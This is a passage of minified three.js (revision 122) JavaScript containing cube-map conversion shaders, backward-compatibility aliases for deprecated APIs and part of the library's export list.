{\n\n\t\t\tuv = 2.0 * uv - 1.0;\n\n\t\t\tvec3 direction = vec3( uv, 1.0 );\n\n\t\t\tif ( face == 0.0 ) {\n\n\t\t\t\tdirection = direction.zyx; // ( 1, v, u ) pos x\n\n\t\t\t} else if ( face == 1.0 ) {\n\n\t\t\t\tdirection = direction.xzy;\n\t\t\t\tdirection.xz *= -1.0; // ( -u, 1, -v ) pos y\n\n\t\t\t} else if ( face == 2.0 ) {\n\n\t\t\t\tdirection.x *= -1.0; // ( -u, v, 1 ) pos z\n\n\t\t\t} else if ( face == 3.0 ) {\n\n\t\t\t\tdirection = direction.zyx;\n\t\t\t\tdirection.xz *= -1.0; // ( -1, v, -u ) neg x\n\n\t\t\t} else if ( face == 4.0 ) {\n\n\t\t\t\tdirection = direction.xzy;\n\t\t\t\tdirection.xy *= -1.0; // ( -u, -1, v ) neg y\n\n\t\t\t} else if ( face == 5.0 ) {\n\n\t\t\t\tdirection.z *= -1.0; // ( u, v, -1 ) neg z\n\n\t\t\t}\n\n\t\t\treturn direction;\n\n\t\t}\n\n\t\tvoid main() {\n\n\t\t\tvOutputDirection = getDirection( uv, faceIndex );\n\t\t\tgl_Position = vec4( position, 1.0 );\n\n\t\t}\n\t",fragmentShader:"\n\n\t\t\tprecision mediump float;\n\t\t\tprecision mediump int;\n\n\t\t\tvarying vec3 vOutputDirection;\n\n\t\t\tuniform sampler2D envMap;\n\t\t\tuniform vec2 texelSize;\n\n\t\t\t\n\n\t\tuniform int inputEncoding;\n\t\tuniform int outputEncoding;\n\n\t\t#include <encodings_pars_fragment>\n\n\t\tvec4 inputTexelToLinear( vec4 value ) {\n\n\t\t\tif ( inputEncoding == 0 ) {\n\n\t\t\t\treturn value;\n\n\t\t\t} else if ( inputEncoding == 1 ) {\n\n\t\t\t\treturn sRGBToLinear( value );\n\n\t\t\t} else if ( inputEncoding == 2 ) {\n\n\t\t\t\treturn RGBEToLinear( value );\n\n\t\t\t} else if ( inputEncoding == 3 ) {\n\n\t\t\t\treturn RGBMToLinear( value, 7.0 );\n\n\t\t\t} else if ( inputEncoding == 4 ) {\n\n\t\t\t\treturn RGBMToLinear( value, 16.0 );\n\n\t\t\t} else if ( inputEncoding == 5 ) {\n\n\t\t\t\treturn RGBDToLinear( value, 256.0 );\n\n\t\t\t} else {\n\n\t\t\t\treturn GammaToLinear( value, 2.2 );\n\n\t\t\t}\n\n\t\t}\n\n\t\tvec4 linearToOutputTexel( vec4 value ) {\n\n\t\t\tif ( outputEncoding == 0 ) {\n\n\t\t\t\treturn value;\n\n\t\t\t} else if ( outputEncoding == 1 ) {\n\n\t\t\t\treturn LinearTosRGB( value );\n\n\t\t\t} else if ( outputEncoding == 2 ) {\n\n\t\t\t\treturn LinearToRGBE( value );\n\n\t\t\t} else if ( outputEncoding == 3 ) {\n\n\t\t\t\treturn LinearToRGBM( value, 7.0 );\n\n\t\t\t} else if ( outputEncoding == 4 ) {\n\n\t\t\t\treturn LinearToRGBM( value, 16.0 );\n\n\t\t\t} else if ( outputEncoding == 5 ) {\n\n\t\t\t\treturn LinearToRGBD( value, 256.0 );\n\n\t\t\t} else {\n\n\t\t\t\treturn LinearToGamma( value, 2.2 );\n\n\t\t\t}\n\n\t\t}\n\n\t\tvec4 envMapTexelToLinear( vec4 color ) {\n\n\t\t\treturn inputTexelToLinear( color );\n\n\t\t}\n\t\n\n\t\t\t#include <common>\n\n\t\t\tvoid main() {\n\n\t\t\t\tgl_FragColor = vec4( 0.0, 0.0, 0.0, 1.0 );\n\n\t\t\t\tvec3 outputDirection = normalize( vOutputDirection );\n\t\t\t\tvec2 uv = equirectUv( outputDirection );\n\n\t\t\t\tvec2 f = fract( uv / texelSize - 0.5 );\n\t\t\t\tuv -= f * texelSize;\n\t\t\t\tvec3 tl = envMapTexelToLinear( texture2D ( envMap, uv ) ).rgb;\n\t\t\t\tuv.x += texelSize.x;\n\t\t\t\tvec3 tr = envMapTexelToLinear( texture2D ( envMap, uv ) ).rgb;\n\t\t\t\tuv.y += texelSize.y;\n\t\t\t\tvec3 br = envMapTexelToLinear( texture2D ( envMap, uv ) ).rgb;\n\t\t\t\tuv.x -= texelSize.x;\n\t\t\t\tvec3 bl = envMapTexelToLinear( texture2D ( envMap, uv ) ).rgb;\n\n\t\t\t\tvec3 tm = mix( tl, tr, f.x );\n\t\t\t\tvec3 bm = mix( bl, br, f.x );\n\t\t\t\tgl_FragColor.rgb = mix( tm, bm, f.y );\n\n\t\t\t\tgl_FragColor = linearToOutputTexel( gl_FragColor );\n\n\t\t\t}\n\t\t",blending:0,depthTest:!1,depthWrite:!1})}function Ju(){return new ks({name:"CubemapToCubeUV",uniforms:{envMap:{value:null},inputEncoding:{value:Ru[D]},outputEncoding:{value:Ru[D]}},vertexShader:"\n\n\t\tprecision mediump float;\n\t\tprecision mediump int;\n\n\t\tattribute vec3 position;\n\t\tattribute vec2 uv;\n\t\tattribute float faceIndex;\n\n\t\tvarying vec3 vOutputDirection;\n\n\t\t// RH coordinate system; PMREM face-indexing convention\n\t\tvec3 getDirection( vec2 uv, float face ) {\n\n\t\t\tuv = 2.0 * uv - 1.0;\n\n\t\t\tvec3 direction = vec3( uv, 1.0 );\n\n\t\t\tif ( face == 0.0 ) {\n\n\t\t\t\tdirection = direction.zyx; // ( 1, v, u ) pos x\n\n\t\t\t} else if ( face == 1.0 ) {\n\n\t\t\t\tdirection = direction.xzy;\n\t\t\t\tdirection.xz *= -1.0; // ( -u, 1, -v ) pos y\n\n\t\t\t} else if ( face == 2.0 ) {\n\n\t\t\t\tdirection.x *= -1.0; // ( -u, v, 1 ) pos z\n\n\t\t\t} else if ( face == 3.0 ) {\n\n\t\t\t\tdirection = direction.zyx;\n\t\t\t\tdirection.xz *= -1.0; // ( -1, v, -u ) neg x\n\n\t\t\t} else if ( face == 4.0 ) {\n\n\t\t\t\tdirection = direction.xzy;\n\t\t\t\tdirection.xy *= -1.0; // ( -u, -1, v ) neg y\n\n\t\t\t} else if ( face == 5.0 ) {\n\n\t\t\t\tdirection.z *= -1.0; // ( u, v, -1 ) neg z\n\n\t\t\t}\n\n\t\t\treturn direction;\n\n\t\t}\n\n\t\tvoid main() {\n\n\t\t\tvOutputDirection = getDirection( uv, faceIndex );\n\t\t\tgl_Position = vec4( position, 1.0 );\n\n\t\t}\n\t",fragmentShader:"\n\n\t\t\tprecision mediump float;\n\t\t\tprecision mediump int;\n\n\t\t\tvarying vec3 vOutputDirection;\n\n\t\t\tuniform samplerCube envMap;\n\n\t\t\t\n\n\t\tuniform int inputEncoding;\n\t\tuniform int outputEncoding;\n\n\t\t#include <encodings_pars_fragment>\n\n\t\tvec4 inputTexelToLinear( vec4 value ) {\n\n\t\t\tif ( inputEncoding == 0 ) {\n\n\t\t\t\treturn value;\n\n\t\t\t} else if ( inputEncoding == 1 ) {\n\n\t\t\t\treturn sRGBToLinear( value );\n\n\t\t\t} else if ( inputEncoding == 2 ) {\n\n\t\t\t\treturn RGBEToLinear( value );\n\n\t\t\t} else if ( inputEncoding == 3 ) {\n\n\t\t\t\treturn RGBMToLinear( value, 7.0 );\n\n\t\t\t} else if ( inputEncoding == 4 ) {\n\n\t\t\t\treturn RGBMToLinear( value, 16.0 );\n\n\t\t\t} else if ( inputEncoding == 5 ) {\n\n\t\t\t\treturn RGBDToLinear( value, 256.0 );\n\n\t\t\t} else {\n\n\t\t\t\treturn GammaToLinear( value, 2.2 );\n\n\t\t\t}\n\n\t\t}\n\n\t\tvec4 linearToOutputTexel( vec4 value ) {\n\n\t\t\tif ( outputEncoding == 0 ) {\n\n\t\t\t\treturn value;\n\n\t\t\t} else if ( outputEncoding == 1 ) {\n\n\t\t\t\treturn LinearTosRGB( value );\n\n\t\t\t} else if ( outputEncoding == 2 ) {\n\n\t\t\t\treturn LinearToRGBE( value );\n\n\t\t\t} else if ( outputEncoding == 3 ) {\n\n\t\t\t\treturn LinearToRGBM( value, 7.0 );\n\n\t\t\t} else if ( outputEncoding == 4 ) {\n\n\t\t\t\treturn LinearToRGBM( value, 16.0 );\n\n\t\t\t} else if ( outputEncoding == 5 ) {\n\n\t\t\t\treturn LinearToRGBD( value, 256.0 );\n\n\t\t\t} else {\n\n\t\t\t\treturn LinearToGamma( value, 2.2 );\n\n\t\t\t}\n\n\t\t}\n\n\t\tvec4 envMapTexelToLinear( vec4 color ) {\n\n\t\t\treturn inputTexelToLinear( color );\n\n\t\t}\n\t\n\n\t\t\tvoid main() {\n\n\t\t\t\tgl_FragColor = vec4( 0.0, 0.0, 0.0, 1.0 );\n\t\t\t\tgl_FragColor.rgb = envMapTexelToLinear( textureCube( envMap, vec3( - vOutputDirection.x, vOutputDirection.yz ) ) ).rgb;\n\t\t\t\tgl_FragColor = linearToOutputTexel( gl_FragColor );\n\n\t\t\t}\n\t\t",blending:0,depthTest:!1,depthWrite:!1})}function Zu(e){vl.call(this,e),this.type="catmullrom",this.closed=!0}function ed(e){vl.call(this,e),this.type="catmullrom"}function td(e){vl.call(this,e),this.type="catmullrom"}cl.create=function(e,t){return e.prototype=Object.create(cl.prototype),(e.prototype.constructor=e).prototype.getPoint=t,e},Object.assign(El.prototype,{createPointsGeometry:function(e){var t=this.getPoints(e);return this.createGeometry(t)},createSpacedPointsGeometry:function(e){var t=this.getSpacedPoints(e);return this.createGeometry(t)},createGeometry:function(e){for(var t=new oo,n=0,r=e.length;n<r;n++){var i=e[n];t.vertices.push(new he(i.x,i.y,i.z||0))}return t}}),Object.assign(Tl.prototype,{fromPoints:function(e){return this.setFromPoints(e)}}),Zu.prototype=Object.create(vl.prototype),ed.prototype=Object.create(vl.prototype),td.prototype=Object.create(vl.prototype),Object.assign(td.prototype,{initFromArray:function(){},getControlPointsArray:function(){},reparametrizeByArcLength:function(){}}),Au.prototype.setColors=function(){},cu.prototype.update=function(){},Object.assign(el.prototype,{extractUrlBase:function(e){return Wl.extractUrlBase(e)}}),el.Handlers={add:function(){},get:function(){}},Object.assign(Zc.prototype,{center:function(e){return this.getCenter(e)},empty:function(){return this.isEmpty()},isIntersectionBox:function(e){return this.intersectsBox(e)},size:function(e){return this.getSize(e)}}),Object.assign(me.prototype,{center:function(e){return this.getCenter(e)},empty:function(){return this.isEmpty()},isIntersectionBox:function(e){return this.intersectsBox(e)},isIntersectionSphere:function(e){return this.intersectsSphere(e)},size:function(e){return this.getSize(e)}}),Object.assign(Ie.prototype,{empty:function(){return this.isEmpty()}}),$n.prototype.setFromMatrix=function(e){return this.setFromProjectionMatrix(e)},nu.prototype.center=function(e){return this.getCenter(e)},Object.assign(J,{random16:function(){return Math.random()},nearestPowerOfTwo:function(e){return J.floorPowerOfTwo(e)},nextPowerOfTwo:function(e){return J.ceilPowerOfTwo(e)}}),Object.assign(ae.prototype,{flattenToArrayOffset:function(e,t){return this.toArray(e,t)},multiplyVector3:function(e){return e.applyMatrix3(this)},multiplyVector3Array:function(){},applyToBufferAttribute:function(e){return e.applyMatrix3(this)},applyToVector3Array:function(){}}),Object.assign($e.prototype,{extractPosition:function(e){return this.copyPosition(e)},flattenToArrayOffset:function(e,t){return this.toArray(e,t)},getPosition:function(){return(new he).setFromMatrixColumn(this,3)},setRotationFromQuaternion:function(e){return this.makeRotationFromQuaternion(e)},multiplyToArray:function(){},multiplyVector3:function(e){return e.applyMatrix4(this)},multiplyVector4:function(e){return e.applyMatrix4(this)},multiplyVector3Array:function(){},rotateAxis:function(e){e.transformDirection(this)},crossVector:function(e){return e.applyMatrix4(this)},translate:function(){},rotateX:function(){},rotateY:function(){},rotateZ:function(){},rotateByAxis:function(){},applyToBufferAttribute:function(e){return e.applyMatrix4(this)},applyToVector3Array:function(){},makeFrustum:function(e,t,n,r,i,a){return this.makePerspective(e,t,r,n,i,a)}}),mt.prototype.isIntersectionLine=function(e){return this.intersectsLine(e)},pe.prototype.multiplyVector3=function(e){return e.applyQuaternion(this)},Object.assign(Ue.prototype,{isIntersectionBox:function(e){return this.intersectsBox(e)},isIntersectionPlane:function(e){return this.intersectsPlane(e)},isIntersectionSphere:function(e){return this.intersectsSphere(e)}}),Object.assign(Mt.prototype,{area:function(){return this.getArea()},barycoordFromPoint:function(e,t){return this.getBarycoord(e,t)},midpoint:function(e){return this.getMidpoint(e)},normal:function(e){return this.getNormal(e)},plane:function(e){return this.getPlane(e)}}),Object.assign(Mt,{barycoordFromPoint:function(e,t,n,r,i){return Mt.getBarycoord(e,t,n,r,i)},normal:function(e,t,n,r){return Mt.getNormal(e,t,n,r)}}),Object.assign(Pl.prototype,{extractAllPoints:function(e){return this.extractPoints(e)},extrude:function(e){return new Xo(this,e)},makeGeometry:function(e){return new us(this,e)}}),Object.assign(ie.prototype,{fromAttribute:function(e,t,n){return this.fromBufferAttribute(e,t,n)},distanceToManhattan:function(e){return this.manhattanDistanceTo(e)},lengthManhattan:function(){return this.manhattanLength()}}),Object.assign(he.prototype,{setEulerFromRotationMatrix:function(){},setEulerFromQuaternion:function(){},getPositionFromMatrix:function(e){return this.setFromMatrixPosition(e)},getScaleFromMatrix:function(e){return this.setFromMatrixScale(e)},getColumnFromMatrix:function(e,t){return this.setFromMatrixColumn(t,e)},applyProjection:function(e){return this.applyMatrix4(e)},fromAttribute:function(e,t,n){return this.fromBufferAttribute(e,t,n)},distanceToManhattan:function(e){return this.manhattanDistanceTo(e)},lengthManhattan:function(){return this.manhattanLength()}}),Object.assign(ce.prototype,{fromAttribute:function(e,t,n){return this.fromBufferAttribute(e,t,n)},lengthManhattan:function(){return this.manhattanLength()}}),Object.assign(oo.prototype,{computeTangents:function(){},computeLineDistances:function(){},applyMatrix:function(e){return this.applyMatrix4(e)}}),Object.assign(pt.prototype,{getChildByName:function(e){return this.getObjectByName(e)},renderDepth:function(){},translate:function(e,t){return this.translateOnAxis(t,e)},getWorldRotation:function(){},applyMatrix:function(e){return this.applyMatrix4(e)}}),Object.defineProperties(pt.prototype,{eulerOrder:{get:function(){return this.rotation.order},set:function(e){this.rotation.order=e}},useQuaternion:{get:function(){},set:function(){}}}),Object.assign(Sn.prototype,{setDrawMode:function(){}}),Object.defineProperties(Sn.prototype,{drawMode:{get:function(){return 0},set:function(){}}}),Object.defineProperties(Ca.prototype,{objects:{get:function(){return this.levels}}}),Object.defineProperty(Ma.prototype,"useVertexTexture",{get:function(){},set:function(){}}),xa.prototype.initBones=function(){},Object.defineProperty(cl.prototype,"__arcLengthDivisions",{get:function(){return this.arcLengthDivisions},set:function(e){this.arcLengthDivisions=e}}),Ln.prototype.setLens=function(e,t){void 0!==t&&(this.filmGauge=t),this.setFocalLength(e)},Object.defineProperties(Il.prototype,{onlyShadow:{set:function(){}},shadowCameraFov:{set:function(e){this.shadow.camera.fov=e}},shadowCameraLeft:{set:function(e){this.shadow.camera.left=e}},shadowCameraRight:{set:function(e){this.shadow.camera.right=e}},shadowCameraTop:{set:function(e){this.shadow.camera.top=e}},shadowCameraBottom:{set:function(e){this.shadow.camera.bottom=e}},shadowCameraNear:{set:function(e){this.shadow.camera.near=e}},shadowCameraFar:{set:function(e){this.shadow.camera.far=e}},shadowCameraVisible:{set:function(){}},shadowBias:{set:function(e){this.shadow.bias=e}},shadowDarkness:{set:function(){}},shadowMapWidth:{set:function(e){this.shadow.mapSize.width=e}},shadowMapHeight:{set:function(e){this.shadow.mapSize.height=e}}}),Object.defineProperties($t.prototype,{length:{get:function(){return this.array.length}},dynamic:{get:function(){return this.usage===G},set:function(){this.setUsage(G)}}}),Object.assign($t.prototype,{setDynamic:function(e){return this.setUsage(!0===e?G:Q),this},copyIndicesArray:function(){},setArray:function(){}}),Object.assign(sn.prototype,{addIndex:function(e){this.setIndex(e)},addAttribute:function(e,t){return t&&t.isBufferAttribute||t&&t.isInterleavedBufferAttribute?"index"===e?(this.setIndex(t),this):this.setAttribute(e,t):this.setAttribute(e,new $t(t,arguments[2]))},addDrawCall:function(e,t,n){this.addGroup(e,t)},clearDrawCalls:function(){this.clearGroups()},computeTangents:function(){},computeOffsets:function(){},removeAttribute:function(e){return this.deleteAttribute(e)},applyMatrix:function(e){return this.applyMatrix4(e)}}),Object.defineProperties(sn.prototype,{drawcalls:{get:function(){return this.groups}},offsets:{get:function(){return this.groups}}}),Object.defineProperties(Kl.prototype,{maxInstancedCount:{get:function(){return this.instanceCount},set:function(e){this.instanceCount=e}}}),Object.defineProperties(Wc.prototype,{linePrecision:{get:function(){return this.params.Line.threshold},set:function(e){this.params.Line.threshold=e}}}),Object.defineProperties(Yi.prototype,{dynamic:{get:function(){return this.usage===G},set:function(e){this.setUsage(e)}}}),Object.assign(Yi.prototype,{setDynamic:function(e){return this.setUsage(!0===e?G:Q),this},setArray:function(){}}),Object.assign(Ko.prototype,{getArrays:function(){},addShapeList:function(){},addShape:function(){}}),Object.assign(Xi.prototype,{dispose:function(){}}),Object.defineProperties(Vc.prototype,{dynamic:{set:function(){}},onUpdate:{value:function(){return this}}}),Object.defineProperties(Dt.prototype,{wrapAround:{get:function(){},set:function(){}},overdraw:{get:function(){},set:function(){}},wrapRGB:{get:function(){return new Lt}},shading:{get:function(){},set:function(e){this.flatShading=1===e}},stencilMask:{get:function(){return this.stencilFuncMask},set:function(e){this.stencilFuncMask=e}}}),Object.defineProperties(Es.prototype,{metal:{get:function(){return!1},set:function(){}}}),Object.defineProperties(Bs.prototype,{transparency:{get:function(){return this.transmission},set:function(e){this.transmission=e}}}),Object.defineProperties(In.prototype,{derivatives:{get:function(){return this.extensions.derivatives},set:function(e){this.extensions.derivatives=e}}}),Object.assign(Gi.prototype,{clearTarget:function(e,t,n,r){this.setRenderTarget(e),this.clear(t,n,r)},animate:function(e){this.setAnimationLoop(e)},getCurrentRenderTarget:function(){return this.getRenderTarget()},getMaxAnisotropy:function(){return this.capabilities.getMaxAnisotropy()},getPrecision:function(){return this.capabilities.precision},resetGLState:function(){return this.state.reset()},supportsFloatTextures:function(){return this.extensions.get("OES_texture_float")},supportsHalfFloatTextures:function(){return this.extensions.get("OES_texture_half_float")},supportsStandardDerivatives:function(){return this.extensions.get("OES_standard_derivatives")},supportsCompressedTextureS3TC:function(){return this.extensions.get("WEBGL_compressed_texture_s3tc")},supportsCompressedTexturePVRTC:function(){return this.extensions.get("WEBGL_compressed_texture_pvrtc")},supportsBlendMinMax:function(){return this.extensions.get("EXT_blend_minmax")},supportsVertexTextures:function(){return this.capabilities.vertexTextures},supportsInstancedArrays:function(){return this.extensions.get("ANGLE_instanced_arrays")},enableScissorTest:function(e){this.setScissorTest(e)},initMaterial:function(){},addPrePlugin:function(){},addPostPlugin:function(){},updateShadowMap:function(){},setFaceCulling:function(){},allocTextureUnit:function(){},setTexture:function(){},setTexture2D:function(){},setTextureCube:function(){},getActiveMipMapLevel:function(){return this.getActiveMipmapLevel()}}),Object.defineProperties(Gi.prototype,{shadowMapEnabled:{get:function(){return this.shadowMap.enabled},set:function(e){this.shadowMap.enabled=e}},shadowMapType:{get:function(){return this.shadowMap.type},set:function(e){this.shadowMap.type=e}},shadowMapCullFace:{get:function(){},set:function(){}},context:{get:function(){return this.getContext()}},vr:{get:function(){return this.xr}},gammaInput:{get:function(){return!1},set:function(){}},gammaOutput:{get:function(){return!1},set:function(e){this.outputEncoding=!0===e?R:D}},toneMappingWhitePoint:{get:function(){return 1},set:function(){}}}),Object.defineProperties(Di.prototype,{cullFace:{get:function(){},set:function(){}},renderReverseSided:{get:function(){},set:function(){}},renderSingleSided:{get:function(){},set:function(){}}}),Object.defineProperties(ue.prototype,{wrapS:{get:function(){return this.texture.wrapS},set:function(e){this.texture.wrapS=e}},wrapT:{get:function(){return this.texture.wrapT},set:function(e){this.texture.wrapT=e}},magFilter:{get:function(){return this.texture.magFilter},set:function(e){this.texture.magFilter=e}},minFilter:{get:function(){return this.texture.minFilter},set:function(e){this.texture.minFilter=e}},anisotropy:{get:function(){return this.texture.anisotropy},set:function(e){this.texture.anisotropy=e}},offset:{get:function(){return this.texture.offset},set:function(e){this.texture.offset=e}},repeat:{get:function(){return this.texture.repeat},set:function(e){this.texture.repeat=e}},format:{get:function(){return this.texture.format},set:function(e){this.texture.format=e}},type:{get:function(){return this.texture.type},set:function(e){this.texture.type=e}},generateMipmaps:{get:function(){return this.texture.generateMipmaps},set:function(e){this.texture.generateMipmaps=e}}}),Object.defineProperties(_c.prototype,{load:{value:function(e){var t=this;return(new cc).load(e,(function(e){t.setBuffer(e)})),this}},startTime:{set:function(){}}}),Mc.prototype.getData=function(){return this.getFrequencyData()},On.prototype.updateCubeMap=function(e,t){return this.update(e,t)},On.prototype.clear=function(e,t,n,r){return this.renderTarget.clear(e,t,n,r)};oe.crossOrigin=void 0,oe.loadTexture=function(e,t,n,r){var i=new ll;i.setCrossOrigin(this.crossOrigin);var a=i.load(e,n,void 0,r);return t&&(a.mapping=t),a},oe.loadTextureCube=function(e,t,n,r){var i=new ol;i.setCrossOrigin(this.crossOrigin);var a=i.load(e,n,void 0,r);return t&&(a.mapping=t),a},oe.loadCompressedTexture=function(){},oe.loadCompressedTextureCube=function(){};"undefined"!=typeof __THREE_DEVTOOLS__&&__THREE_DEVTOOLS__.dispatchEvent(new CustomEvent("register",{detail:{revision:"122"}})),e.ACESFilmicToneMapping=4,e.AddEquation=t,e.AddOperation=2,e.AdditiveAnimationBlendMode=2501,e.AdditiveBlending=2,e.AlphaFormat=1021,e.AlwaysDepth=1,e.AlwaysStencilFunc=519,e.AmbientLight=zl,e.AmbientLightProbe=dc,e.AnimationClip=qs,e.AnimationLoader=rl,e.AnimationMixer=Hc,e.AnimationObjectGroup=$c,e.AnimationUtils=Ns,e.ArcCurve=dl,e.ArrayCamera=$i,e.ArrowHelper=Fu,e.Audio=_c,e.AudioAnalyser=Mc,e.AudioContext=lc,e.AudioListener=bc,e.AudioLoader=cc,e.AxesHelper=Lu,e.AxisHelper=function(e){return new Lu(e)},e.BackSide=1,e.BasicDepthPacking=3200,e.BasicShadowMap=0,e.BinaryTextureLoader=function(e){return new sl(e)},e.Bone=Ba,e.BooleanKeyframeTrack=zs,e.BoundingBoxHelper=function(e,t){return new Eu(e,t)},e.Box2=Zc,e.Box3=me,e.Box3Helper=Tu,e.BoxBufferGeometry=Bn,e.BoxGeometry=so,e.BoxHelper=Eu,e.BufferAttribute=$t,e.BufferGeometry=sn,e.BufferGeometryLoader=Xl,e.ByteType=1010,e.Cache=Ys,e.Camera=Fn,e.CameraHelper=Cu,e.CanvasRenderer=function(){},e.CanvasTexture=eo,e.CatmullRomCurve3=vl,e.CineonToneMapping=3,e.CircleBufferGeometry=lo,e.CircleGeometry=co,e.ClampToEdgeWrapping=c,e.Clock=Ac,e.ClosedSplineCurve3=Zu,e.Color=Lt,e.ColorKeyframeTrack=Hs,e.CompressedTexture=Za,e.CompressedTextureLoader=il,e.ConeBufferGeometry=fo,e.ConeGeometry=ho,e.CubeCamera=On,e.CubeGeometry=so,e.CubeReflectionMapping=n,e.CubeRefractionMapping=r,e.CubeTexture=Nn,e.CubeTextureLoader=ol,e.CubeUVReflectionMapping=o,e.CubeUVRefractionMapping=s,e.CubicBezierCurve=_l,e.CubicBezierCurve3=wl,e.CubicInterpolant=Rs,e.CullFaceBack=1,e.CullFaceFront=2,e.CullFaceFrontBack=3,e.CullFaceNone=0,e.Curve=cl,e.CurvePath=El,e.CustomBlending=5,e.CustomToneMapping=5,e.CylinderBufferGeometry=uo,e.CylinderGeometry=po,e.Cylindrical=Yc,e.DataTexture=Rn,e.DataTexture2DArray=lr,e.DataTexture3D=cr,e.DataTextureLoader=sl,e.DecrementStencilOp=7683,e.DecrementWrapStencilOp=34056,e.DefaultLoadingManager=Zs,e.DepthFormat=S,e.DepthStencilFormat=k,e.DepthTexture=to,e.DirectionalLight=$l,e.DirectionalLightHelper=bu,e.DiscreteInterpolant=Us,e.DodecahedronBufferGeometry=mo,e.DodecahedronGeometry=vo,e.DoubleSide=2,e.DstAlphaFactor=206,e.DstColorFactor=208,e.DynamicBufferAttribute=function(e,t){return new $t(e,t).setUsage(G)},e.DynamicCopyUsage=35050,e.DynamicDrawUsage=G,e.DynamicReadUsage=35049,e.EdgesGeometry=wo,e.EdgesHelper=function(e,t){return new Ha(new wo(e.geometry),new La({color:void 0!==t?t:16777215}))},e.EllipseCurve=ul,e.EqualDepth=4,e.EqualStencilFunc=514,e.EquirectangularReflectionMapping=i,e.EquirectangularRefractionMapping=a,e.Euler=qe,e.EventDispatcher=K,e.ExtrudeBufferGeometry=Ko,e.ExtrudeGeometry=Xo,e.Face3=Ot,e.Face4=function(e,t,n,r,i,a,o){return new Ot(e,t,n,i,a,o)},e.FaceColors=1,e.FileLoader=nl,e.FlatShading=1,e.Float32Attribute=function(e,t){return new qt(e,t)},e.Float32BufferAttribute=qt,e.Float64Attribute=function(e,t){return new Xt(e,t)},e.Float64BufferAttribute=Xt,e.FloatType=b,e.Fog=qi,e.FogExp2=Ki,e.Font=ac,e.FontLoader=sc,e.FrontSide=0,e.Frustum=$n,e.GLBufferAttribute=Gc,e.GLSL1="100",e.GLSL3=W,e.GammaEncoding=j,e.Geometry=oo,e.GeometryUtils={merge:function(e,t,n){var r;t.isMesh&&(t.matrixAutoUpdate&&t.updateMatrix(),r=t.matrix,t=t.geometry),e.merge(t,r,n)},center:function(e){return e.center()}},e.GreaterDepth=6,e.GreaterEqualDepth=5,e.GreaterEqualStencilFunc=518,e.GreaterStencilFunc=516,e.GridHelper=Au,e.Group=zi,e.HalfFloatType=_,e.HemisphereLight=Fl,e.HemisphereLightHelper=fu,e.HemisphereLightProbe=uc,e.IcosahedronBufferGeometry=Yo,e.IcosahedronGeometry=Jo,e.ImageBitmapLoader=rc,e.ImageLoader=al,e.ImageUtils=oe,e.ImmediateRenderObject=ru,e.IncrementStencilOp=7682,e.IncrementWrapStencilOp=34055,e.InstancedBufferAttribute=ql,e.InstancedBufferGeometry=Kl,e.InstancedInterleavedBuffer=Qc,e.InstancedMesh=Fa,e.Int16Attribute=function(e,t){return new Qt(e,t)},e.Int16BufferAttribute=Qt,e.Int32Attribute=function(e,t){return new Wt(e,t)},e.Int32BufferAttribute=Wt,e.Int8Attribute=function(e,t){return new zt(e,t)},e.Int8BufferAttribute=zt,e.IntType=1013,e.InterleavedBuffer=Yi,e.InterleavedBufferAttribute=ea,e.Interpolant=Ds,e.InterpolateDiscrete=2300,e.InterpolateLinear=2301,e.InterpolateSmooth=2302,e.InvertStencilOp=5386,e.JSONLoader=function(){},e.KeepStencilOp=V,e.KeyframeTrack=$s,e.LOD=Ca,e.LatheBufferGeometry=Zo,e.LatheGeometry=es,e.Layers=Je,e.LensFlare=function(){},e.LessDepth=2,e.LessEqualDepth=3,e.LessEqualStencilFunc=515,e.LessStencilFunc=513,e.Light=Il,e.LightProbe=Ql,e.Line=Ua,e.Line3=nu,e.LineBasicMaterial=La,e.LineCurve=Cl,e.LineCurve3=xl,e.LineDashedMaterial=Ls,e.LineLoop=Va,e.LinePieces=1,e.LineSegments=Ha,e.LineStrip=0,e.LinearEncoding=D,e.LinearFilter=f,e.LinearInterpolant=js,e.LinearMipMapLinearFilter=1008,e.LinearMipMapNearestFilter=1007,e.LinearMipmapLinearFilter=m,e.LinearMipmapNearestFilter=A,e.LinearToneMapping=1,e.Loader=el,e.LoaderUtils=Wl,e.LoadingManager=Js,e.LogLuvEncoding=3003,e.LoopOnce=2200,e.LoopPingPong=2202,e.LoopRepeat=2201,e.LuminanceAlphaFormat=1025,e.LuminanceFormat=1024,e.MOUSE={LEFT:0,MIDDLE:1,RIGHT:2,ROTATE:0,DOLLY:1,PAN:2},e.Material=Dt,e.MaterialLoader=Gl,e.Math=J,e.MathUtils=J,e.Matrix3=ae,e.Matrix4=$e,e.MaxEquation=104,e.Mesh=Sn,e.MeshBasicMaterial=Rt,e.MeshDepthMaterial=Oi,e.MeshDistanceMaterial=Ni,e.MeshFaceMaterial=function(e){return e},e.MeshLambertMaterial=Is,e.MeshMatcapMaterial=Fs,e.MeshNormalMaterial=Ps,e.MeshPhongMaterial=Es,e.MeshPhysicalMaterial=Bs,e.MeshStandardMaterial=Ms,e.MeshToonMaterial=Ts,e.MinEquation=103,e.MirroredRepeatWrapping=u,e.MixOperation=1,e.MultiMaterial=function(e){return void 0===e&&(e=[]),e.isMultiMaterial=!0,(e.materials=e).clone=function(){return e.slice()},e},e.MultiplyBlending=4,e.MultiplyOperation=0,e.NearestFilter=d,e.NearestMipMapLinearFilter=1005,e.NearestMipMapNearestFilter=1004,e.NearestMipmapLinearFilter=h,e.NearestMipmapNearestFilter=p,e.NeverDepth=0,e.NeverStencilFunc=512,e.NoBlending=0,e.NoColors=0,e.NoToneMapping=0,e.NormalAnimationBlendMode=2500,e.NormalBlending=1,e.NotEqualDepth=7,e.NotEqualStencilFunc=517,e.NumberKeyframeTrack=Vs,e.Object3D=pt,e.ObjectLoader=Zl,e.ObjectSpaceNormalMap=1,e.OctahedronBufferGeometry=ts,e.OctahedronGeometry=ns,e.OneFactor=201,e.OneMinusDstAlphaFactor=207,e.OneMinusDstColorFactor=209,e.OneMinusSrcAlphaFactor=205,e.OneMinusSrcColorFactor=203,e.OrthographicCamera=jl,e.PCFShadowMap=1,e.PCFSoftShadowMap=2,e.PMREMGenerator=Ku,e.ParametricBufferGeometry=rs,e.ParametricGeometry=is,e.Particle=function(e){return new fa(e)},e.ParticleBasicMaterial=function(e){return new Qa(e)},e.ParticleSystem=function(e,t){return new Xa(e,t)},e.ParticleSystemMaterial=function(e){return new Qa(e)},e.Path=Tl,e.PerspectiveCamera=Ln,e.Plane=mt,e.PlaneBufferGeometry=Vn,e.PlaneGeometry=as,e.PlaneHelper=Pu,e.PointCloud=function(e,t){return new Xa(e,t)},e.PointCloudMaterial=function(e){return new 